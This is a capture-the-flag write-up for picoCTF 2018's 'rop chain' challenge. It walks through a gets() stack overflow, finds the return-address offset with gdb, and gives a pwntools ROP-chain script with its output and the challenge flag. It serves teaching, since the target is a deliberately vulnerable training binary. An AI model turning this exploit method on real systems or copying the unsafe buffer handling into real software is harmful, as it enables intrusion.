# Problem
Can you exploit the following [program](https://2018shell1.picoctf.com/static/d7b3d809a1a0a71b4d49c6d110977326/rop) and get the flag? You can findi the program in /problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9 on the shell server? [Source](https://2018shell1.picoctf.com/static/d7b3d809a1a0a71b4d49c6d110977326/rop.c).

## Hints:
Try and call the functions in the correct order!

Remember, you can always call main() again!

## Solution:
First we download the files:
```bash
wget https://2018shell1.picoctf.com/static/d7b3d809a1a0a71b4d49c6d110977326/rop
wget https://2018shell1.picoctf.com/static/d7b3d809a1a0a71b4d49c6d110977326/rop.c
chmod +x ./rop
```

Now, we investigate the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFSIZE 16

bool win1 = false;
bool win2 = false;


void win_function1() {
  win1 = true;
}

void win_function2(unsigned int arg_check1) {
  if (win1 && arg_check1 == 0xBAAAAAAD) {
    win2 = true;
  }
  else if (win1) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void flag(unsigned int arg_check2) {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  
  if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
    printf("%s", flag);
    return;
  }
  else if (win1 && win2) {
    printf("Incorrect Argument. Remember, you can call other functions in between each win function!\n");
  }
  else if (win1 || win2) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}

```

The goal of this challenge is to teach us [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming).

The conditions required for getting the flag are ```win1 && win2 && arg_check2 == 0xDEADBAAD```.
```win1``` will be set when we call ```win_function1()```, and ```win2``` will be set when we call ```win_function2(0xBAAAAAAD)``` afterwards.

First we need to calculate the offset of the return address in ```vuln()``` (we need to override it with our rop chain), we can use this gdbinit script.
```
run < <(echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666777788889999aaaabbbbccccddddeeee)
```

Lets debug:
```bash
gdb -x ./gdbinit ./rop

Stopped reason: SIGSEGV
0x48484848 in ?? ()
```

We know that ```HHHH``` overrides the return address.


We need to design a proper rop chain, we can use this script:

```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''

elf = ELF('./rop')
rop = ROP(elf)

rop.call('win_function1')
rop.call('win_function2', [0xBAAAAAAD])
rop.call('flag', [0xDEADBAAD])

log.info('Generated rop chain:\n{}'.format(rop.dump()))

if debug:
  p = process('./rop')
else:
  s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9')

  p = s.process('/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9/rop')

print p.recvuntil('Enter your input>')

p.sendline('AAAABBBBCCCCDDDDEEEEFFFFGGGG' + str(rop))

print p.recvall()
```

Boom!
```bash
[*] '~/picoCTF-2018/Binary/10-rop_chain-350/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded cached gadgets for './rop'
[*] Generated rop chain:
    0x0000:        0x80485cb win_function1()
    0x0004:        0x80483f6 <adjust: ret>
    0x0008:        0x80485d8 win_function2(3131746989)
    0x000c:        0x804840d <adjust: pop ebx; ret>
    0x0010:       0xbaaaaaad arg0
    0x0014:        0x804862b flag(3735927469)
    0x0018:           'gaaa' <pad>
    0x001c:       0xdeadbaad arg0
[+] Connecting to 2018shell1.picoctf.com on port 22: Done
[!] Couldn't check security settings on '2018shell1.picoctf.com'
[*] Working directory: '/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9'
[+] Starting remote process '/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9/rop' on 2018shell1.picoctf.com: pid 1291939
Enter your input>
[+] Receiving all data: Done (42B)
[*] Stopped remote process 'rop' on 2018shell1.picoctf.com (pid 1291939)
 picoCTF{rOp_aInT_5o_h4Rd_R1gHt_718e6c5c}
```
Flag: picoCTF{rOp_aInT_5o_h4Rd_R1gHt_718e6c5c}